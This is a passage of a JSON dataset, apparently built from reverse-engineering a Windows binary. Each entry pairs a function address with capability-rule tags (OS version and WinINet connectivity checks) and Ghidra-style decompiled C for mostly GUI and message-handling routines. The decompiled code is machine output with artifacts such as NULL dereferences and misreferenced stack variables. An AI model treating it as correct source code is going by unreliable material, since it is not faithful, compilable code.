        "token_count": 504
    },
    "00450f68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00450f68(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x494d28 + 0xd) != '\\0') && (*(in_EAX + 0x5f) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 69
    },
    "00450f98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00450f98(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x494d28 + 0xd) != '\\0') && (iVar1 = *(in_EAX + 0x5f) - 1,  iVar1 < 2)) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "004510cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004510cc(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    *arg_8h = 0;\n    if (*(in_EAX + 0xe2) != 0) {\n        *arg_8h = 1;\n        (**(in_EAX + 0xe0))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00451108": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451108(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00451154": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451154(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10a) != 0) {\n        (**(in_EAX + 0x108))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0045126c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045126c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xfa) != 0) {\n        (**(in_EAX + 0xf8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "004512ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nchar __cdecl fcn.004512ec(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    char var_ah;\n    uint var_9h;\n    uint uStack9;\n    uint var_1h;\n    \n    var_9h = *arg_8h;\n    uStack9 = arg_8h[1];\n    var_ah = '\\0';\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))(&var_ah, &var_9h);\n    }\n    if (var_ah == '\\0') {\n        *(in_EAX + 0x98) = *(in_EAX + 0x98) + in_ECX;\n        while (uVar2 = *(in_EAX + 0x98) >> 0x1f,  0x77 < (*(in_EAX + 0x98) ^ uVar2) - uVar2) {\n            iVar1 = *(in_EAX + 0x98);\n            uVar2 = *(in_EAX + 0x98) >> 0x1f;\n            *(in_EAX + 0x98) = ((*(in_EAX + 0x98) ^ uVar2) - uVar2) + -0x78;\n            if (iVar1 < 0) {\n                if (*(in_EAX + 0x98) != 0) {\n                    *(in_EAX + 0x98) = -*(in_EAX + 0x98);\n                }\n                var_ah = fcn.0040484c();\n            }\n            else {\n                var_ah = fcn.0040484c();\n            }\n        }\n    }\n    return var_ah;\n}\n",
        "token_count": 426
    },
    "00451458": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00451458(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uStack52 = 0x45146d;\n    iVar1 = (**(*param_2 + 0x38))();\n    if (var_1h == '\\0') {\n        var_20h = param_2[0x13];\n        var_1ch = param_2[0x14];\n        var_18h = param_2[0x15];\n        var_14h = param_2[0x16];\n    }\n    else {\n        var_20h = param_2[0x19];\n        var_1ch = param_2[0x1a];\n        var_18h = param_2[0x1b];\n        var_14h = param_2[0x1c];\n    }\n    uStack52 = 0x451494;\n    uVar2 = sub.user32.dll_GetDesktopWindow();\n    uStack52 = 0x402;\n    uStack56 = 0;\n    puStack64 = 0x4514a7;\n    uStack60 = uVar2;\n    uVar3 = sub.user32.dll_GetDCEx();\n    uStack68 = 0x451573;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &fcn.00451458::var_1h + 1;\n    uVar4 = fcn.00424fec();\n    uVar5 = sub.gdi32.dll_SelectObject(uVar3, uVar4);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h + iVar1, var_1ch, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_18h - iVar1, var_1ch + iVar1, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_14h - iVar1, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_1ch, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    uVar4 = uVar3;\n    sub.gdi32.dll_SelectObject(uVar3, uVar5);\n    *in_FS_OFFSET = uVar4;\n    sub.user32.dll_ReleaseDC(uVar2, uVar3, 0x45157a);\n    return;\n}\n",
        "token_count": 786
    },
    "004515a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004515a4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uchar auStack28 [5];\n    uint uStack23;\n    \n    cVar1 = fcn.004047dc();\n    if ((*0x499c88 != '\\0') && (cVar1 == '\\0')) {\n        fcn.00404800();\n    }\n    fcn.004503d4();\n    if (*(param_2 + 4) < 3) {\n        auStack28[0] = 1;\n        if (cVar1 == '\\0') {\n            uVar2 = *(param_2 + 4);\n            fcn.0040484c(auStack28, uVar2, uStack23);\n        }\n        else {\n            uVar2 = *(param_2 + 4);\n            fcn.0040484c(auStack28, uVar2, uStack23);\n        }\n        *(param_2 + 0xc) = uVar2 & 0xff;\n    }\n    else if (*(param_2 + 4) == 3) {\n        if (cVar1 == '\\0') {\n            fcn.0040484c(uStack23);\n        }\n        else {\n            fcn.0040484c(uStack23);\n        }\n    }\n    return;\n}\n",
        "token_count": 303
    },
    "00451694": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00451694(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint *arg_8h_00;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    if ((in_EDX == 0) || (in_EDX == -1)) {\n        iVar3 = *(in_EAX + 0x94);\n        if (((iVar3 == 0) || (*(iVar3 + 0x1db) == '\\0')) || (*(iVar3 + 0x1b0) == 0)) {\n            fcn.00418420();\n            var_1ch = var_24h;\n            var_18h = var_20h;\n            if (*(in_EAX + 0x30) != 0) {\n                fcn.00450324();\n                var_1ch = var_24h;\n                var_18h = var_20h;\n            }\n        }\n        else {\n            (**(**(iVar3 + 0x1b0) + 0x14))();\n            var_34h = 2;\n            fcn.004585f8();\n            sub.user32.dll_MapWindowPoints();\n        }\n        uVar2 = fcn.00450820();\n        arg_8h_00 = &fcn.00451694::var_34h;\n        uStack80 = 0x451745;\n        fcn.00450834();\n        uStack80 = 0x451752;\n        fcn.00418470(arg_8h_00, uVar2);\n        var_1ch = var_34h;\n        var_18h = uStack52;\n        uStack24 = uStack48;\n        uStack20 = uStack44;\n        uStack80 = 0x451766;\n        var_5h = fcn.00451874();\n        goto code_r0x00451867;\n    }\n    fcn.00451b80();\n    if (*(in_EAX + 0x94) == 0) {\ncode_r0x00451799:\n        var_5h = 1;\n    }\n    else {\n        cVar1 = fcn.0040484c();\n        if (cVar1 != '\\0') goto code_r0x00451799;\n        var_5h = 0;\n    }\n    if (var_5h != 0) {\n        var_ch = fcn.0044dc08();\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        if (*(in_EAX + 0x94) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = fcn.004585f8();\n        }\n        fcn.004501b4();\n        if (iVar3 != 0) {\n            sub.user32.dll_MapWindowPoints(iVar3, 0, &fcn.00451694::var_1ch, 2);\n        }\n        *(var_ch + 8) = in_EDX;\n        *(var_ch + 0x5c) = arg_8h;\n        *(var_ch + 0x60) = var_4h;\n        *(var_ch + 0x4c) = var_1ch;\n        *(var_ch + 0x50) = var_18h;\n        *(var_ch + 0x54) = uStack24;\n        *(var_ch + 0x58) = uStack20;\n        uVar2 = fcn.004585f8(&fcn.00451694::var_1ch, 1);\n        sub.user32.dll_MapWindowPoints(0, uVar2);\n        fcn.0040484c();\n        *in_FS_OFFSET = var_18h;\n        uVar4 = fcn.00404650(0x451867);\n        return uVar4;\n    }\ncode_r0x00451867:\n    return var_5h;\n}\n",
        "token_count": 982
    },
    "0045191c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0045191c(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = CONCAT31(param_1 >> 8, 1);\n    if (*(in_EAX + 0xb2) != 0) {\n        (**(in_EAX + 0xb0))(&uStack8, param_1);\n    }\n    return CONCAT44(uStack8, uStack8) & 0xffffffff000000ff;\n}\n",
        "token_count": 112
    },
    "004519e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004519e8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xba) != 0) {\n        (**(in_EAX + 0xb8))(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00451a78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451a78(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piStack28;\n    int32_t *piStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    piStack28 = *(in_EAX[0x1d] + 0x14);\n    if (piStack28 == NULL) {\n        piStack28 = NULL;\n    }\n    piStack24 = *(in_EAX[0x1d] + 0x10);\n    if (piStack24 == NULL) {\n        piStack24 = NULL;\n    }\n    iStack20 = *(in_EAX[0x1d] + 0xc);\n    if (iStack20 == 0) {\n        iStack20 = 0;\n    }\n    iStack16 = *(in_EAX[0x1d] + 8);\n    if (iStack16 == 0) {\n        iStack16 = 0;\n    }\n    (**(*in_EAX + 0x38))();\n    if ((piStack28 < 1) || (*param_2 <= piStack28)) {\n        if ((0 < &iStack16) && (*param_2 < &iStack16)) {\n            *param_2 = &iStack16;\n        }\n    }\n    else {\n        *param_2 = piStack28;\n    }\n    if ((piStack24 < 1) || (*param_1 <= piStack24)) {\n        if ((0 < &iStack20) && (*param_1 < &iStack20)) {\n            *param_1 = &iStack20;\n        }\n    }\n    else {\n        *param_1 = piStack24;\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "00451b80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00451b80(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = (**(*in_EAX + 0x54))();\n    if (uVar1 != '\\0') {\n        in_EAX[0x28] = in_EAX[0x13];\n        in_EAX[0x27] = in_EAX[0x12];\n        return in_EAX[0x12];\n    }\n    if (in_EAX[0x25] != 0) {\n        if ((*(in_EAX + 0x24) == '\\x02') || (*(in_EAX[0x25] + 0x5b) - 1U < 2)) {\n            uVar1 = in_EAX[0x13];\n            in_EAX[0x2a] = uVar1;\n        }\n        else if ((*(in_EAX + 0x24) == '\\x01') || (uVar1 = *(in_EAX[0x25] + 0x5b) - 5,  *(in_EAX[0x25] + 0x5b) - 3U < 2))\n        {\n            uVar1 = in_EAX[0x12];\n            in_EAX[0x29] = uVar1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 308
    },
    "00451c28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00451c28(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint lpKeyState;\n    int32_t *var_15h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    if (((((*(in_EAX + 7) & 0x10) == 0) || (*NULL = fcn.0043bd90(),  *NULL == NULL)) || ((*NULL)[0xa6] == 0)) ||\n       (cVar3 = (**(*(*NULL)[0xa6] + 0x24))(),  cVar3 == '\\0')) {\n        if ((*param_2 < 0x100) || (0x109 < *param_2)) {\n            uVar1 = *param_2;\n            if ((uVar1 < 0x200) || (0x20a < uVar1)) {\n                if (uVar1 == 0xb00b) {\n                    fcn.00450430(param_2[2]);\n                }\n            }\n            else {\n                if (((*(in_EAX + 0x14) & 0x80) == 0) && (((uVar1 == 0x203 || (uVar1 == 0x206)) || (uVar1 == 0x209)))) {\n                    *param_2 = *param_2 - 2;\n                }\n    // switch table (8 cases) at 0x451d01\n                switch(*param_2) {\n                case 0x200:\n                    fcn.004472d8();\n                    break;\n                case 0x201:\n                case 0x203:\n                    if (*(in_EAX + 0x5d) == '\\x01') {\n                        fcn.0040484c();\n                        return;\n                    }\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 1;\n                    break;\n                case 0x202:\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfffe;\n                    break;\n                default:\n                    if (((*(*0x499c5c + 0x20) != '\\0') && (*(*0x499c5c + 0x1c) != 0)) &&\n                       (*param_2 == *(*0x499c5c + 0x1c))) {\n                        sub.user32.dll_GetKeyboardState(&lpKeyState);\n                        var_10h = *param_2;\n                        var_ch._0_1_ = fcn.0043bc90();\n                        var_ch._2_2_ = *(param_2 + 1);\n                        var_8h = param_2[2];\n                        fcn.0040484c();\n                        return;\n                    }\n                    break;\n                case 0x207:\n                    if ((((*(in_EAX + 0x52) & 8) != 0) && (*0x451ef4 == (*0x451ef0 & *(in_EAX + 0x15)))) &&\n                       (cVar3 = fcn.0045d598(),  cVar3 == '\\0')) {\n                        fcn.0045d524();\n                        var_15h._0_1_ = '\\0';\n                        piVar2 = *(*0x499c5c + 0x28);\n                        if (piVar2 != NULL) {\n                            cVar3 = fcn.004047dc();\n                            if (cVar3 == '\\0') {\n                                if (in_EAX[0xc] == 0) {\n                                    *NULL = fcn.0043bd90();\n                                    if (*NULL != NULL) {\n                                        fcn.004585f8();\n                                        var_15h._0_1_ = (**(**(*0x499c5c + 0x28) + 0xe0))();\n                                    }\n                                }\n                                else {\n                                    fcn.004585f8();\n                                    var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                                }\n                            }\n                            else {\n                                fcn.004585f8();\n                                var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                            }\n                        }\n                        if (var_15h == '\\0') {\n                            if (*(*0x499c5c + 0x28) != 0) {\n                                fcn.0045d664();\n                            }\n                        }\n                        else {\n                            param_2[3] = 1;\n                            fcn.00447430();\n                        }\n                    }\n                }\n            }\n        }\n        else {\n            *NULL = fcn.0043bd90();\n            if ((*NULL != NULL) && (cVar3 = (**(**NULL + 0x100))(),  cVar3 != '\\0')) {\n                return;\n            }\n        }\n        (**(*in_EAX + -0x14))();\n    }\n    return;\n}\n",
        "token_count": 1126
    },
    "00451fd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00451fd4(int32_t arg_8h)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    \n    if (in_AL == '\\0') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x180))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x4521e4 == (*(*(arg_8h + -8) + 0x61) & *0x4521e0))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x40))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x01') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x184))) ||\n           (((*(*(arg_8h + -4) + 0x20) == 0 &&\n             ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x4521e4 == (*(*(arg_8h + -8) + 0x61) & *0x4521e8))))) &&\n            (iVar1 = *(*(arg_8h + -8) + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x44))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x02') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x188))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x4521ec == (*(*(arg_8h + -8) + 0x61) & *0x4521ec))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x48))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if ((in_AL == '\\x03') &&\n            (((iVar1 = *(*(arg_8h + -4) + 0x20),  iVar1 != 0 &&\n              (iVar1 = *(iVar1 + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x18c))) ||\n             (((*(*(arg_8h + -4) + 0x20) == 0 &&\n               ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x4521f0 == (*(*(arg_8h + -8) + 0x61) & *0x4521f0))))) &&\n              (iVar1 = *(*(arg_8h + -8) + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x4c))))))) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 902
    },
    "00452410": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00452410(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xc2) != 0) {\n        (**(in_EAX + 0xc0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "00452590": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00452590(uint *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    char cVar4;\n    \n    cVar4 = '\\0';\n    uVar1 = *param_2;\n    uVar2 = *param_1;\n    cVar3 = fcn.004519b8();\n    if (cVar3 != '\\0') {\n        if (((*(in_EAX + 0x5c) == '\\0') || (cVar3 = fcn.0045194c(),  cVar3 != '\\0')) ||\n           (cVar3 = fcn.004519b8(),  cVar3 != '\\0')) {\n            cVar4 = '\\x01';\n        }\n        else {\n            cVar4 = '\\0';\n        }\n        if (cVar4 != '\\0') {\n            *param_2 = uVar1;\n            *param_1 = uVar2;\n        }\n    }\n    return cVar4;\n}\n",
        "token_count": 238
    },
    "004526dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004526dc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xca) != 0) {\n        (**(in_EAX + 200))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00452788": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00452788(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xd2) != 0) {\n        (**(in_EAX + 0xd0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "00452a94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452a94(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x5a) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            fcn.00452a5c(&stack0xfffffffc);\n        }\n        else {\n            fcn.00452a5c(&stack0xfffffffc);\n        }\n        *(in_EAX + 0x5a) = 1;\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "00452b64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452b64(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*(*0x494d28 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "00452bf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00452bf0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x56) != '\\0') {\n        fcn.00450988();\n        *(in_EAX + 0x56) = 1;\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "00452dac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452dac(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = (**(*in_EAX + 0x54))();\n    if ((cVar1 == '\\0') || (in_EAX[0xc] == 0)) {\n        iVar2 = fcn.00452c9c();\n        if (iVar2 != 0) {\n            *(*(param_2 + 8) + 8) = iVar2;\n            uVar3 = fcn.004585f8();\n            *(*(param_2 + 8) + 0xc) = uVar3;\n        }\n    }\n    else {\n        fcn.00452d20(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "00452e0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
